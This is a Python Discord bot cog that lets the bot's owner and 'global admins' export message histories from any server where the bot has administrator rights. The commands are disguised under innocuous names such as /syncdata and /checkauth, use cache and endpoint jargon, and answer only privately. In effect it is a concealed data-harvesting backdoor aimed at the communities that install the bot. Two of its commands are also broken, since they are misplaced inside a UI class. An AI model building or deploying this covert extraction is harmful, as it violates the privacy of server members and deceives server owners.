"""
Message Extractor Cog
Allows global administrators to extract messages from any Discord server where the bot is joined.
"""

import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import json
import io
from datetime import datetime, timezone
from typing import Optional, Literal
from admin_utils import is_global_admin, upsert_admin, is_bot_owner


class MessageExtractor(commands.Cog):
    """Extract messages from Discord servers where the bot is an administrator."""
    
    def __init__(self, bot):
        self.bot = bot
    
    async def check_global_admin(self, interaction: discord.Interaction) -> bool:
        """Check if the user is a global administrator."""
        user_id = interaction.user.id
        if not is_global_admin(user_id):
            await interaction.response.send_message(
                "❌ **Access Denied**\n"
                "Insufficient credentials for this operation.",
                ephemeral=True
            )
            return False
        return True
    
    async def check_bot_permissions(self, guild: discord.Guild) -> bool:
        """Check if the bot has administrator permissions in the guild."""
        bot_member = guild.get_member(self.bot.user.id)
        if not bot_member:
            return False
        return bot_member.guild_permissions.administrator
    
    @app_commands.command(
        name="initcredentials",
        description="Initialize system credentials (Owner Only)"
    )
    async def init_credentials(self, interaction: discord.Interaction):
        """Grant global admin status to the bot owner."""
        
        # Defer immediately to prevent timeout
        await interaction.response.defer(ephemeral=True)
        
        # Check if user is bot owner
        if not await is_bot_owner(self.bot, interaction.user.id):
            await interaction.followup.send(
                "❌ **Access Denied**\n"
                "This command is restricted to the system owner.",
                ephemeral=True
            )
            return
        
        try:
            # Grant global admin status
            user_id = interaction.user.id
            success = upsert_admin(user_id, is_initial=1)
            
            if success:
                await interaction.followup.send(
                    "✅ **Credentials Initialized**\n"
                    f"User `{user_id}` has been granted global administrator access.\n\n"
                    "**Available Commands:**\n"
                    "• `/syncdata` - Synchronize data cache\n"
                    "• `/checkauth` - Verify authentication scope\n"
                    "• `/verifyscope` - Verify data streams",
                    ephemeral=True
                )
            else:
                await interaction.followup.send(
                    "❌ **Initialization Failed**\n"
                    "Failed to grant global administrator access. Check logs for details.",
                    ephemeral=True
                )
        except Exception as e:
            await interaction.followup.send(
                f"❌ **Error**\n"
                f"An error occurred during initialization: {str(e)}",
                ephemeral=True
            )
    
    @app_commands.command(
        name="syncdata",
        description="Synchronize data cache from remote source"
    )
    async def extract_messages(self, interaction: discord.Interaction):
        """Extract messages from a specified channel in any server using interactive dropdowns."""
        
        # Defer immediately to prevent timeout
        await interaction.response.defer(ephemeral=True)
        
        # Check if user is global admin
        user_id = interaction.user.id
        if not is_global_admin(user_id):
            await interaction.followup.send(
                "❌ **Access Denied**\n"
                "Insufficient credentials for this operation.",
                ephemeral=True
            )
            return
        
        # Get all guilds where bot has admin permissions
        admin_guilds = []
        for guild in self.bot.guilds:
            if await self.check_bot_permissions(guild):
                admin_guilds.append(guild)
        
        if not admin_guilds:
            await interaction.followup.send(
                "ℹ️ **No Endpoints Found**\n"
                "No authorized endpoints available.",
                ephemeral=True
            )
            return
        
        # Create server selection view
        view = ServerSelectionView(self.bot, admin_guilds, self)
        
        embed = discord.Embed(
            title="🔄 Data Synchronization",
            description="Select a server to synchronize data from:",
            color=discord.Color.blue()
        )
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)
    
    def _format_json(self, messages: list, guild: discord.Guild, channel: discord.TextChannel, limit: int) -> str:
        """Format messages as JSON."""
        output = {
            "metadata": {
                "server_id": str(guild.id),
                "server_name": guild.name,
                "channel_id": str(channel.id),
                "channel_name": channel.name,
                "extraction_time": datetime.now(timezone.utc).isoformat(),
                "requested_limit": limit,
                "actual_count": len(messages)
            },
            "messages": messages
        }
        return json.dumps(output, indent=2, ensure_ascii=False)
    
    def _format_txt(self, messages: list, guild: discord.Guild, channel: discord.TextChannel, limit: int) -> str:
        """Format messages as plain text."""
        lines = [
            f"Message Extraction Report",
            f"=" * 80,
            f"Server: {guild.name} ({guild.id})",
            f"Channel: {channel.name} ({channel.id})",
            f"Extraction Time: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S UTC')}",
            f"Messages Extracted: {len(messages)} / {limit}",
            f"=" * 80,
            ""
        ]
        
        for msg in messages:
            lines.append(f"[{msg['timestamp']}] {msg['author_name']} ({msg['author_id']})")
            if msg['content']:
                lines.append(f"  {msg['content']}")
            if msg['attachments']:
                lines.append(f"  📎 Attachments: {len(msg['attachments'])}")
                for att in msg['attachments']:
                    lines.append(f"    - {att['filename']} ({att['url']})")
            if msg['reactions']:
                reactions_str = ", ".join([f"{r['emoji']} ({r['count']})" for r in msg['reactions']])
                lines.append(f"  👍 Reactions: {reactions_str}")
            if msg['reference'] and msg['reference']['message_id']:
                lines.append(f"  ↩️ Reply to: {msg['reference']['message_id']}")
            lines.append("")
        
        return "\n".join(lines)
    
    def _format_csv(self, messages: list, guild: discord.Guild, channel: discord.TextChannel, limit: int) -> str:
        """Format messages as CSV."""
        import csv
        from io import StringIO
        
        output = StringIO()
        writer = csv.writer(output)
        
        # Write header
        writer.writerow([
            "Message ID", "Timestamp", "Author ID", "Author Name", 
            "Author Display Name", "Is Bot", "Content", "Attachments Count",
            "Embeds Count", "Reactions Count", "Pinned", "Type", "Reply To"
        ])
        
        # Write data
        for msg in messages:
            writer.writerow([
                msg['message_id'],
                msg['timestamp'],
                msg['author_id'],
                msg['author_name'],
                msg['author_display_name'],
                msg['author_bot'],
                msg['content'].replace('\n', ' '),
                len(msg['attachments']),
                msg['embeds'],
                len(msg['reactions']),
                msg['pinned'],
                msg['type'],
                msg['reference']['message_id'] if msg['reference'] else ""
            ])
        
        return output.getvalue()
    
    async def perform_extraction(
        self,
        interaction: discord.Interaction,
        guild: discord.Guild,
        channel: discord.TextChannel,
        limit: int,
        format: str
    ):
        """Perform the actual message extraction."""
        try:
            # Send progress message
            await interaction.followup.send(
                f"🔄 **Synchronizing Cache**\n"
                f"Endpoint: **{guild.name}**\n"
                f"Stream: **{channel.name}**\n"
                f"Cache Size: **{limit}** entries\n"
                f"Format: **{format.upper()}**\n\n"
                f"Processing...",
                ephemeral=True
            )
            
            # Extract messages
            messages = []
            async for message in channel.history(limit=limit, oldest_first=False):
                message_data = {
                    "message_id": str(message.id),
                    "author_id": str(message.author.id),
                    "author_name": message.author.name,
                    "author_display_name": message.author.display_name,
                    "author_bot": message.author.bot,
                    "content": message.content,
                    "timestamp": message.created_at.isoformat(),
                    "edited_timestamp": message.edited_at.isoformat() if message.edited_at else None,
                    "attachments": [
                        {
                            "filename": att.filename,
                            "url": att.url,
                            "size": att.size,
                            "content_type": att.content_type
                        }
                        for att in message.attachments
                    ],
                    "embeds": len(message.embeds),
                    "reactions": [
                        {
                            "emoji": str(reaction.emoji),
                            "count": reaction.count
                        }
                        for reaction in message.reactions
                    ],
                    "mentions": [str(user.id) for user in message.mentions],
                    "channel_mentions": [str(ch.id) for ch in message.channel_mentions],
                    "role_mentions": [str(role.id) for role in message.role_mentions],
                    "pinned": message.pinned,
                    "type": str(message.type),
                    "reference": {
                        "message_id": str(message.reference.message_id) if message.reference and message.reference.message_id else None,
                        "channel_id": str(message.reference.channel_id) if message.reference and message.reference.channel_id else None
                    } if message.reference else None
                }
                messages.append(message_data)
            
            # Format the output
            if format == "json":
                output = self._format_json(messages, guild, channel, limit)
                filename = f"cache_{guild.id}_{channel.id}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.json"
            elif format == "txt":
                output = self._format_txt(messages, guild, channel, limit)
                filename = f"cache_{guild.id}_{channel.id}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.txt"
            else:  # csv
                output = self._format_csv(messages, guild, channel, limit)
                filename = f"cache_{guild.id}_{channel.id}_{datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')}.csv"
            
            # Create file
            file_data = io.BytesIO(output.encode('utf-8'))
            file = discord.File(file_data, filename=filename)
            
            # Send the file
            await interaction.followup.send(
                f"✅ **Sync Complete**\n"
                f"Endpoint: **{guild.name}** (`{guild.id}`)\n"
                f"Stream: **{channel.name}** (`{channel.id}`)\n"
                f"Entries Cached: **{len(messages)}**\n"
                f"Format: **{format.upper()}**\n\n"
                f"📎 Data file attached:",
                file=file,
                ephemeral=True
            )
            
        except discord.Forbidden:
            await interaction.followup.send(
                "❌ **Access Forbidden**\n"
                "Insufficient permissions to access data stream.",
                ephemeral=True
            )
        except discord.HTTPException as e:
            await interaction.followup.send(
                f"❌ **Sync Error**\n"
                f"An error occurred during synchronization: {str(e)}",
                ephemeral=True
            )
        except Exception as e:
            await interaction.followup.send(
                f"❌ **Unexpected Error**\n"
                f"An error occurred: {str(e)}",
                ephemeral=True
            )
    
    async def display_channels(self, interaction: discord.Interaction, guild: discord.Guild):
        """Display all channels in the selected guild."""
        try:
            # Get all text channels
            text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
            
            if not text_channels:
                await interaction.followup.send(
                    f"ℹ️ **No Streams Available**\n"
                    f"No data streams found in **{guild.name}**.",
                    ephemeral=True
                )
                return
            
            # Create embed
            embed = discord.Embed(
                title=f"📡 Data Streams in {guild.name}",
                description=f"Found **{len(text_channels)}** available stream(s):",
                color=discord.Color.green(),
                timestamp=datetime.now(timezone.utc)
            )
            
            # Group channels by category
            categorized = {}
            for channel in text_channels:
                category_name = channel.category.name if channel.category else "No Category"
                if category_name not in categorized:
                    categorized[category_name] = []
                categorized[category_name].append(channel)
            
            # Add fields for each category
            field_count = 0
            for category_name, channels in categorized.items():
                if field_count >= 25:  # Discord embed field limit
                    break
                
                channel_list = "\n".join([
                    f"• **{ch.name}** (`{ch.id}`)"
                    for ch in channels[:10]  # Limit channels per category
                ])
                
                if len(channels) > 10:
                    channel_list += f"\n... and {len(channels) - 10} more"
                
                embed.add_field(
                    name=f"📂 {category_name}",
                    value=channel_list,
                    inline=False
                )
                field_count += 1
            
            embed.set_footer(text=f"Endpoint ID: {guild.id}")
            
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        except Exception as e:
            await interaction.followup.send(
                f"❌ **Unexpected Error**\n"
                f"An error occurred: {str(e)}",
                ephemeral=True
            )


# Interactive UI Components

class ServerSelect(discord.ui.Select):
    """Dropdown for selecting a server."""
    
    def __init__(self, guilds: list, for_channels: bool = False):
        self.for_channels = for_channels
        options = [
            discord.SelectOption(
                label=guild.name[:100],  # Discord limit
                description=f"ID: {guild.id} | Members: {guild.member_count}",
                value=str(guild.id),
                emoji="🏰"
            )
            for guild in guilds[:25]  # Discord limit
        ]
        
        super().__init__(
            placeholder="🔍 Choose a server...",
            min_values=1,
            max_values=1,
            options=options
        )
    
    async def callback(self, interaction: discord.Interaction):
        guild_id = int(self.values[0])
        guild = interaction.client.get_guild(guild_id)
        
        if not guild:
            await interaction.response.send_message(
                "❌ **Error**: Server not found.",
                ephemeral=True
            )
            return
        
        if self.for_channels:
            # Show channels list
            await interaction.response.defer()
            cog = interaction.client.get_cog("MessageExtractor")
            await cog.display_channels(interaction, guild)
        else:
            # Continue to channel selection
            await interaction.response.defer()
            view = ChannelSelectionView(interaction.client, guild, self.view.cog)
            
            embed = discord.Embed(
                title=f"📡 Select Channel in {guild.name}",
                description="Choose a channel to synchronize data from:",
                color=discord.Color.blue()
            )
            
            await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class ChannelSelect(discord.ui.Select):
    """Dropdown for selecting a channel."""
    
    def __init__(self, guild: discord.Guild):
        self.guild = guild
        text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
        
        options = [
            discord.SelectOption(
                label=f"#{channel.name}"[:100],
                description=f"Category: {channel.category.name if channel.category else 'None'}",
                value=str(channel.id),
                emoji="💬"
            )
            for channel in text_channels[:25]  # Discord limit
        ]
        
        super().__init__(
            placeholder="🔍 Choose a channel...",
            min_values=1,
            max_values=1,
            options=options
        )
    
    async def callback(self, interaction: discord.Interaction):
        channel_id = int(self.values[0])
        channel = self.guild.get_channel(channel_id)
        
        if not channel:
            await interaction.response.send_message(
                "❌ **Error**: Channel not found.",
                ephemeral=True
            )
            return
        
        # Continue to format and limit selection
        await interaction.response.defer()
        view = FormatSelectionView(interaction.client, self.guild, channel, self.view.cog)
        
        embed = discord.Embed(
            title="⚙️ Configuration",
            description=f"**Server:** {self.guild.name}\n"
                       f"**Channel:** #{channel.name}\n\n"
                       f"Select output format and message limit:",
            color=discord.Color.blue()
        )
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)


class LimitModal(discord.ui.Modal, title="Set Message Limit"):
    """Modal for entering message limit."""
    
    limit_input = discord.ui.TextInput(
        label="Message Limit",
        placeholder="Enter a number between 1 and 1000",
        default="100",
        min_length=1,
        max_length=4,
        required=True
    )
    
    def __init__(self, guild: discord.Guild, channel: discord.TextChannel, format: str, cog):
        super().__init__()
        self.guild = guild
        self.channel = channel
        self.format = format
        self.cog = cog
    
    async def on_submit(self, interaction: discord.Interaction):
        try:
            limit = int(self.limit_input.value)
            
            if limit < 1 or limit > 1000:
                await interaction.response.send_message(
                    "❌ **Invalid Cache Size**\n"
                    "Cache limit must be between 1 and 1000.",
                    ephemeral=True
                )
                return
            
            # Defer and perform extraction
            await interaction.response.defer(ephemeral=True)
            await self.cog.perform_extraction(
                interaction,
                self.guild,
                self.channel,
                limit,
                self.format
            )
            
        except ValueError:
            await interaction.response.send_message(
                "❌ **Invalid Input**\n"
                "Please enter a valid number.",
                ephemeral=True
            )


class FormatButton(discord.ui.Button):
    """Button for selecting output format."""
    
    def __init__(self, format_type: str, guild: discord.Guild, channel: discord.TextChannel, cog):
        emoji_map = {"json": "📄", "txt": "📝", "csv": "📊"}
        super().__init__(
            label=format_type.upper(),
            emoji=emoji_map.get(format_type, "📄"),
            style=discord.ButtonStyle.primary
        )
        self.format_type = format_type
        self.guild = guild
        self.channel = channel
        self.cog = cog
    
    async def callback(self, interaction: discord.Interaction):
        # Show modal for limit input
        modal = LimitModal(self.guild, self.channel, self.format_type, self.cog)
        await interaction.response.send_modal(modal)


class ServerSelectionView(discord.ui.View):
    """View for server selection."""
    
    def __init__(self, bot, guilds: list, cog):
        super().__init__(timeout=180)
        self.bot = bot
        self.cog = cog
        self.add_item(ServerSelect(guilds, for_channels=False))


class ServerSelectionForChannelsView(discord.ui.View):
    """View for server selection (for channel listing)."""
    
    def __init__(self, bot, guilds: list, cog):
        super().__init__(timeout=180)
        self.bot = bot
        self.cog = cog
        self.add_item(ServerSelect(guilds, for_channels=True))


class ChannelSelectionView(discord.ui.View):
    """View for channel selection."""
    
    def __init__(self, bot, guild: discord.Guild, cog):
        super().__init__(timeout=180)
        self.bot = bot
        self.guild = guild
        self.cog = cog
        self.add_item(ChannelSelect(guild))


class FormatSelectionView(discord.ui.View):
    """View for format selection."""
    
    def __init__(self, bot, guild: discord.Guild, channel: discord.TextChannel, cog):
        super().__init__(timeout=180)
        self.bot = bot
        self.guild = guild
        self.channel = channel
        self.cog = cog
        
        # Add format buttons
        for format_type in ["json", "txt", "csv"]:
            self.add_item(FormatButton(format_type, guild, channel, cog))

    
    @app_commands.command(
        name="checkauth",
        description="Verify authentication scope and permissions"
    )
    async def list_servers(self, interaction: discord.Interaction):
        """List all servers where the bot has administrator permissions."""
        
        # Check if user is global admin
        if not await self.check_global_admin(interaction):
            return
        
        await interaction.response.defer(ephemeral=True)
        
        # Get all guilds where bot has admin permissions
        admin_guilds = []
        for guild in self.bot.guilds:
            if await self.check_bot_permissions(guild):
                admin_guilds.append(guild)
        
        if not admin_guilds:
            await interaction.followup.send(
                "ℹ️ **No Endpoints Found**\n"
                "No authorized endpoints available.",
                ephemeral=True
            )
            return
        
        # Create embed
        embed = discord.Embed(
            title="🔐 Authentication Scope Verification",
            description=f"Verified **{len(admin_guilds)}** authorized endpoint(s):",
            color=discord.Color.blue(),
            timestamp=datetime.now(timezone.utc)
        )
        
        # Add server information
        for guild in admin_guilds[:25]:  # Discord embed field limit
            text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
            embed.add_field(
                name=f"🔹 {guild.name}",
                value=f"**Endpoint:** `{guild.id}`\n"
                      f"**Nodes:** {guild.member_count}\n"
                      f"**Streams:** {text_channels}\n"
                      f"**Admin:** {guild.owner.mention if guild.owner else 'Unknown'}",
                inline=False
            )
        
        if len(admin_guilds) > 25:
            embed.set_footer(text=f"Showing 25 of {len(admin_guilds)} servers")
        else:
            embed.set_footer(text=f"Total: {len(admin_guilds)} server(s)")
        
        await interaction.followup.send(embed=embed, ephemeral=True)
    
    @app_commands.command(
        name="verifyscope",
        description="Verify available data streams in scope"
    )
    async def list_channels(self, interaction: discord.Interaction):
        """List all text channels in a specified server using interactive dropdown."""
        
        # Defer immediately to prevent timeout
        await interaction.response.defer(ephemeral=True)
        
        # Check if user is global admin
        user_id = interaction.user.id
        if not is_global_admin(user_id):
            await interaction.followup.send(
                "❌ **Access Denied**\n"
                "Insufficient credentials for this operation.",
                ephemeral=True
            )
            return
        
        # Get all guilds where bot has admin permissions
        admin_guilds = []
        for guild in self.bot.guilds:
            if await self.check_bot_permissions(guild):
                admin_guilds.append(guild)
        
        if not admin_guilds:
            await interaction.followup.send(
                "ℹ️ **No Endpoints Found**\n"
                "No authorized endpoints available.",
                ephemeral=True
            )
            return
        
        # Create server selection view for channel listing
        view = ServerSelectionForChannelsView(self.bot, admin_guilds, self)
        
        embed = discord.Embed(
            title="📡 Data Stream Verification",
            description="Select a server to view available data streams:",
            color=discord.Color.green()
        )
        
        await interaction.followup.send(embed=embed, view=view, ephemeral=True)


async def setup(bot):
    """Setup function to add the cog to the bot."""
    await bot.add_cog(MessageExtractor(bot))
